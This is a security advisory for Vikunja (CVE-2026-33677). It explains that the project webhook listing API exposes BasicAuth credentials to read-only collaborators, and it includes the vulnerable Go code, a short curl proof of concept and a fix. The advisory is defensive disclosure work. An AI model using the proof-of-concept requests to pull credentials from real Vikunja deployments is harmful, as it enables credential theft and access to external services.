# [M] Vikjuna: Webhook BasicAuth Credentials Exposed to Read-Only Project Collaborators via API

## Summary
Severity: Medium
Advisory: GHSA-7c2g-p23p-4jg3
CVE: CVE-2026-33677
CWE: CWE-200
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-7c2g-p23p-4jg3
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.2.1

## Details
## Summary

The `GET /api/v1/projects/:project/webhooks` endpoint returns webhook BasicAuth credentials (`basic_auth_user` and `basic_auth_password`) in plaintext to any user with read access to the project. While the existing code correctly masks the HMAC `secret` field, the BasicAuth fields added in a later migration were not given the same treatment. This allows read-only collaborators to steal credentials intended for authenticating against external webhook receivers.

## Details

When listing project webhooks, the `ReadAll` method in `pkg/models/webhooks.go` (line 203) only requires project read access:

```go
// pkg/models/webhooks.go:203-244
func (w *Webhook) ReadAll(s *xorm.Session, a web.Auth, _ string, page int, perPage int) (result interface{}, resultCount int, numberOfTotalItems int64, err error) {
	p := &Project{ID: w.ProjectID}
	can, _, err := p.CanRead(s, a)  // Only requires read permission
	if err != nil {
		return nil, 0, 0, err
	}
	if !can {
		return nil, 0, 0, ErrGenericForbidden{}
	}

	// ... fetches webhooks from DB ...

	for _, webhook := range ws {
		webhook.Secret = ""  // HMAC secret is masked
		// BasicAuthUser and BasicAuthPassword are NOT masked
		if createdBy, has := users[webhook.CreatedByID]; has {
			webhook.CreatedBy = createdBy
		}
	}

	return ws, len(ws), total, err
}
```

The `Webhook` struct defines both fields with JSON serialization tags, so they are included in API responses:

```go
// pkg/models/webhooks.go:63-64
BasicAuthUser     string `xorm:"null" json:"basic_auth_user"`
BasicAuthPassword string `xorm:"null" json:"basic_auth_password"`
```

The BasicAuth fields were added in migration `20260123000717` ("Add basic auth to webhooks"), but the credential masking logic at line 238 was not updated to include these new fields.

The same issue exists in the user webhook listing at `pkg/routes/api/v1/user_webhooks.go:65`, where `Secret` is masked but BasicAuth fields are not. This is lower impact since users only see their own webhooks.

## PoC

1. **As User A (project admin)**, create a project and a webhook with BasicAuth credentials:

```bash
# Create a webhook with BasicAuth on project 1
curl -X PUT "http://localhost:3456/api/v1/projects/1/webhooks" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{
    "target_url": "https://external-service.example.com/hook",
    "events": ["task.created"],
    "secret": "my-hmac-secret",
    "basic_auth_user": "service-account",
    "basic_auth_password": "S3cretP@ssw0rd!"
  }'
```

2. **As User B (read-only collaborator on the same project)**, list webhooks:

```bash
curl -s "http://localhost:3456/api/v1/projects/1/webhooks" \
  -H "Authorization: Bearer $TOKEN_B" | jq '.[0] | {secret, basic_auth_user, basic_auth_password}'
```

3. **Expected output** (secret is masked, but BasicAuth is leaked):

```json
{
  "secret": "",
  "basic_auth_user": "service-account",
  "basic_auth_password": "S3cretP@ssw0rd!"
}
```

## Impact

- **Credential theft**: Any user with read-only access to a project can steal BasicAuth credentials configured on that project's webhooks. These credentials may grant access to external services (CI/CD systems, notification endpoints, third-party APIs).
- **Lateral movement**: Stolen credentials could be reused to authenticate against external systems that the webhook receiver protects.
- **Broad exposure surface**: Credentials are exposed to all project readers, including users granted access through team shares and link shares (with read+ permission level).

## Recommended Fix

In `pkg/models/webhooks.go`, add masking for BasicAuth fields alongside the existing `Secret` masking (around line 237):

```go
for _, webhook := range ws {
	webhook.Secret = ""
	webhook.BasicAuthUser = ""
	webhook.BasicAuthPassword = ""
	if createdBy, has := users[webhook.CreatedByID]; has {
		webhook.CreatedBy = createdBy
	}
}
```

Apply the same fix in `pkg/routes/api/v1/user_webhooks.go` (around line 64):

```go
for _, w := range ws {
	w.Secret = ""
	w.BasicAuthUser = ""
	w.BasicAuthPassword = ""
	if createdBy, has := users[w.CreatedByID]; has {
		w.CreatedBy = createdBy
	}
}
```

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-7c2g-p23p-4jg3
- https://nvd.nist.gov/vuln/detail/CVE-2026-33677
- https://github.com/go-vikunja/vikunja
- https://vikunja.io/changelog/vikunja-v2.2.2-was-released
